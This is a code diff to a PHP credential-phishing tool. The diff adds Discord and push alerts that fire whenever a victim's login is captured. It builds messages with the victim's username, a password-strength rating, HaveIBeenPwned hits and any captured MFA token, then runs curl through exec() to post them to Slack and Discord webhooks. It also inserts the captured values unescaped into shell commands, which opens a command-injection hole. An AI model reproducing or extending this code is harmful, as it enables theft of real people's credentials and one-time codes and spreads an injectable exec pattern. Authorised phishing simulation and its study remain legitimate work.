@@ -400,7 +400,7 @@ body {
 <?php }
 
 
-$slacklink = $APIDomain."/results/index.php?project=".$portal;
+$slacklink = $APIDomain."/results/index.php?project=".urlencode($portal);
 
 // Don't Do Anything if the User is Blank (Helps Avoid False Submissions)
 if($user != ""){
@@ -466,6 +466,8 @@ if($passstrength == ":poop:"){$pushstrength = "💩";}else{$pushstrength = "👌
 
 $messagepush = "Caught Another Phish at ".$portal."!\r\nPassword Strength is ".$pushstrength;
 
+$messagediscord = "> Caught Another Phish at ".$portal."! ([".$user."](".$slacklink."))\\n> Password Strength is ".$passstrength;
+
 } else {
 
 // If the Password is Not Set, Do Not Include Password Strength in Slack Message
@@ -473,27 +475,48 @@ $message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)"
 
 $messagepush = "Caught Another Phish at ".$portal."!";
 
+$messagediscord = "> Caught Another Phish at ".$portal."! (\[".$user."](".$slacklink."))";
+
 }
 
-if($TroyHunt == "yes"){$message = $message."\r\n> *_HaveIBeenPwned Hit_* (".number_format($haveibeenpwnedhits).")";}
+if($TroyHunt == "yes"){
+	$message = $message."\r\n> *_HaveIBeenPwned Hit_* (".number_format($haveibeenpwnedhits).")";
+	$messagediscord = $messagediscord."\\n> *_HaveIBeenPwned Hit_* (".number_format($haveibeenpwnedhits).")";
+	$messagepush = $messagepush."\r\nHaveIBeenPwned Hit (".number_format($haveibeenpwnedhits).")";
+	}
 
 if($MFAToken != ""){
-$message = $message."\r\n> MFA Provided as `".$MFAToken."`";	
-$messagepush = $message."\r\nMFA Provided as ".$MFAToken."";
+$message = $message."\r\n> MFA Provided as `".$MFAToken."`";
+$messagediscord = $messagediscord."\\n> MFA Provided as `".$MFAToken."`";	
+$messagepush = $messagepush."\r\nMFA Provided as ".$MFAToken."";
 }
+
+if($SlackIncomingWebhookURL != ""){
 
 // Execute Slack Incoming Webhook
 $cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$SlackIncomingWebhookURL.'';
 
 exec($cmd);
 
-//$message = "Caught Another Phish at ".$portal."!\r\nOther";
+}
+
+
 
 // Execute Web Push Notifications
 $cmdpush = 'cd config && php push.php "'.$messagepush.'" "PhishBot" "./phishicon.png" "'.$slacklink.'" "PhishBot"';
 
 exec($cmdpush);
 
+if($DiscordWebhook != ""){
+
+// Execute Discord Incoming Webhook
+//$messagediscord = urlencode($messagediscord);
+
+$cmddiscord = 'curl -s -X POST -d \'{"username": "'.$slackbotname.'", "content": "'.$messagediscord.'", "avatar_url": "https://i.imgur.com/C0avyV1.png"}\' '.$DiscordWebhook.' -H \'Content-Type:application/json\'';
+
+exec($cmddiscord);
+
+}
 }
 
 
